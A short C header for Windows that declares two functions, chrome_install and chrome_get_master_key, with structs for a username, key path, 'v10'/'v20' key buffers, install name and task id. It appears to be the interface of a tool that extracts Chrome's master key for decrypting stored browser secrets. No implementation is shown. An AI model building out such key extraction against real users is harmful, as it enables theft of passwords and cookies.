#include <windows.h>


typedef struct _master_key_args {
    char* username;
    char* key_path;

    char* v10_key;
    int v10_key_len;
    char* v20_key;
    int v20_key_len;
} master_key_args_t;


typedef struct _install_args {
    char* install_name;
    char* entry_name;
    LPVOID log_ptr;
    int task_id;
} install_args_t;


#ifdef __cplusplus
extern "C" {
#endif
    void chrome_install(install_args_t* args);
    int chrome_get_master_key(master_key_args_t* args);
#ifdef __cplusplus
}
#endif